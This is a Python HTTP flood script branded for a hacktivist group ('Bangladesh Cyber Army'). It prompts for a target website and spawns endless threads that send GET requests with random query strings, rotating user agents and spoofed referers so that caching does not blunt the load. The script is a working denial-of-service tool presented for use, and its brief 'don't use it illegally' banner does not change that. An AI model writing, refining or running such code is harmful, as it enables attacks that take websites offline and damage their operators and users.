import os
import requests
import threading
import random
import os

print(''' 

\033[1;32m [Muslim Hacker] 
\033[1;31m [Hacker R3z7 Final] \033[1;32m [Bangladesh Cyber Army ][ʘ⁠‿⁠ʘ]
Join with us: [Bangladesh Cyber Army]
\033[1;31m [Don't Use it illegal activities]   
''')
url = input("Target Website:").strip()

count = 0
headers = []
referer = [
  "https://ministerbd.com/",
  "https://marazzakkhan.com/",
]


def useragent():
  global headers
  headers.append(
    "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
  headers.append(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
  )
  headers.append(
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36"
  )
  headers.append(
    "Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3"
  )
  headers.append(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0"
  )  #bca
  headers.append(
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15"
  )

  return headers


def genstr(size):
  out_str = ''

  for _ in range(0, size):
    code = random.randint(65, 90)
    out_str += chr(code)

  return out_str


class httpth1(threading.Thread):

  def run(self):
    global count
    while True:
      try:
        headers = {
          'User-Agent': random.choice(useragent()),
          'Referer': random.choice(referer)
        }
        randomized_url = url + "?" + genstr(random.randint(3, 10))
        requests.get(randomized_url, headers=headers)
        count += 1
        print("{0} Send BY Hacker R3z7".format(count))
      except requests.exceptions.ConnectionError:
        print("[Something went wrong!]")
        pass
      except requests.exceptions.InvalidSchema:
        print("[Pleas enter link!!!]")  #BANGLADESH Cyber Army 
        raise SystemExit()
      except ValueError:
        print("[Enter a url]")
        raise SystemExit()
      except KeyboardInterrupt:
        print("[Canceled by User]")
        raise SystemExit()


while True:
  try:
    th1 = httpth1()
    th1.start()
  except Exception:
    pass
  except KeyboardInterrupt:
    exit("[Finished]")
    raise SystemExit()
